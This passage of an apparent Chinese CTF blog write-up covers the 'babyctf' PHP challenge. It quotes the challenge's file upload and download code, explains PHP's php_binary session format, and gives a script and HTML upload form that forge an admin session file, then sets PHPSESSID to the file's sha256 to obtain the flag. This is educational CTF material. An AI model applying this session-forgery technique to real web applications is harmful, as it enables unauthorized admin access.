<p>同时这里已经锁死目录在<code>/var/babyctf/</code>,代码已经对目录是否穿越进行了检查。而这个上传的目录正好又是我们session的存储位置代码开头就设置了session存储目录</p>
<blockquote>
<p>session_save_path(“/var/babyctf/“);</p>
</blockquote>
<p>那我们能不能上传一个session对session进行修改呢？我们看他会将文件本身的名字拼接<code>_sha256(file)</code>,那么我们计算出这个sha256把上传文件名改为sess不就变成一个session文件了。我们再修改cookie就能达到getflag的目的。</p>
<pre><code class="php">$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
}</code></pre>
<p>我们再看最后一部分下载的代码,这段代码很简单，直接direction=download并且post一个filename上去就能下载。这里我们可以直接读取当前session看看这个session是什么类型。</p>
<pre><code class="php"> elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}</code></pre>
<p>可以看到，这个session是php_binary类型</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874019524378.png" alt="img"></p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p>那么我们据此生成一个session文件</p>
<pre><code class="php">&lt;?php

ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);
session_save_path(&quot;C:\\Users\\51763\\Desktop\\&quot;);
session_start();

$_SESSION[&#39;username&#39;] = &#39;admin&#39;;
?&gt;</code></pre>
<p>我们构造表单去上传这个文件,上传时候注意文件名改成<code>sess</code></p>
<pre><code class="html">&lt;html&gt;
&lt;body&gt;

&lt;form action=&quot;http://fd32890b-1f94-4728-9e56-1261066852d8.node3.buuoj.cn/&quot; method=&quot;post&quot;
enctype=&quot;multipart/form-data&quot;&gt;
&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
&lt;input type=&quot;hidden&quot; name=&quot;direction&quot; value=&quot;upload&quot; /&gt; 
&lt;input type=&quot;hidden&quot; name=&quot;attr&quot; value=&quot;success.txt&quot; /&gt; 
&lt;input type=&quot;file&quot; name=&quot;up_file&quot; id=&quot;file&quot; /&gt; 
&lt;br /&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>我们计算这个文件的sha256值是:432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874022155480.png" alt="img"></p>
<p>我们再读取文件看看，是否上传成功。上传成功后将arr参数改成success.txt再上传一次，因为file_exists($filename)检测的是文件或文件夹是否存在，这我们只要建一个文件夹即可。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874023458299.png" alt="img"></p>
<p>直接修改<code>PHPSESSID=432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code> 直接出来flag</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874024375148.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
      src="/header.jpg">
  <p class="site-author-name" itemprop="name">XiaoLeung</p>
  <div class="site-description" itemprop="description">随笔、分享、记录生活</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">74</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearのspace</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">粤ICP备18132442号-1 </a>
      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">粤公网安备 44011202000643号 </a>
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">281k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">4:16</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        


  <div style="display: none;">
    <script src="//s95.cnzz.com/z_stat.php?id=true&web_id=true"></script>
  </div>






      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
